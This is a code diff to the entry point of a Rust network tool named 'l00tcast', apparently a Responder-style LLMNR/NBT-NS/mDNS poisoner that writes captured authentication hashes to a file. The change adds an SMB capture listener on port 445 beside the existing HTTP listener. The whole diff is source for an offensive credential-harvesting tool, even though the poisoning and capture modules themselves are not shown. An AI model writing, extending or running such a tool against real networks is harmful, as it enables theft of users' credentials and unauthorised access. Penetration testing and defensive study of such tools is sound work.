@@ -3,7 +3,7 @@
 
 
 
-use l00tcast::{http_capture, poison};
+use l00tcast::{http_capture, poison, smb};
 use anyhow::Result;
 use clap::Parser;
 use std::net::Ipv4Addr;
@@ -24,10 +24,16 @@ struct Cli {
     mdns: bool,
     #[arg(long)]
     http: bool,
+    #[arg(long)]
+    smb: bool,
 
     /// Port of the HTTP capture listener.
     #[arg(long, default_value_t = 80)]
     http_port: u16,
+
+    /// Port of the SMB capture listener.
+    #[arg(long, default_value_t = 445)]
+    smb_port: u16,
 
     /// File to append captured hashes to.
     #[arg(short, long)]
@@ -37,7 +43,7 @@ struct Cli {
 #[tokio::main]
 async fn main() -> Result<()> {
     let c = Cli::parse();
-    let all = !(c.llmnr || c.nbtns || c.mdns || c.http);
+    let all = !(c.llmnr || c.nbtns || c.mdns || c.http || c.smb);
     let ip = c.interface_ip;
 
     eprintln!("[*] l00tcast — authorised use only. Handing out IP: {ip}");
@@ -60,6 +66,11 @@ async fn main() -> Result<()> {
         let port = c.http_port;
         let out = c.output.clone();
         tasks.push(tokio::spawn(async move { http_capture::run(port, out).await }));
+    }
+    if all || c.smb {
+        let port = c.smb_port;
+        let out = c.output.clone();
+        tasks.push(tokio::spawn(async move { smb::run(port, out).await }));
     }
 
     for t in tasks {
